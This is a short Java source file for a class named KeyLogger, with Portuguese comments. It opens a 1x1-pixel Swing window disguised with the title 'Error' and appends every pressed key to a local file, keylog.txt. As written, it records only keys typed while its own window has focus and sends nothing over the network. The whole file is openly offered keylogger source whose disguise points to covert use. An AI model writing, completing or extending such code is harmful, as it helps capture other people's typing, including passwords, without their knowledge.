package logger;

import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import javax.swing.JFrame;

public class KeyLogger extends JFrame implements KeyListener {

    private BufferedWriter writer;

    public KeyLogger() {
        this.setTitle("Error");
        this.setSize(1, 1);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.addKeyListener(this);
        try {
            writer = new BufferedWriter(new FileWriter("keylog.txt", true));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void keyPressed(KeyEvent e) {
        try {
            // Salva a tecla pressionada no arquivo
            writer.write(e.getKeyChar());
            writer.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void keyReleased(KeyEvent e) {
        // Não implementado
    }

    @Override
    public void keyTyped(KeyEvent e) {
        // Não implementado
    }


}
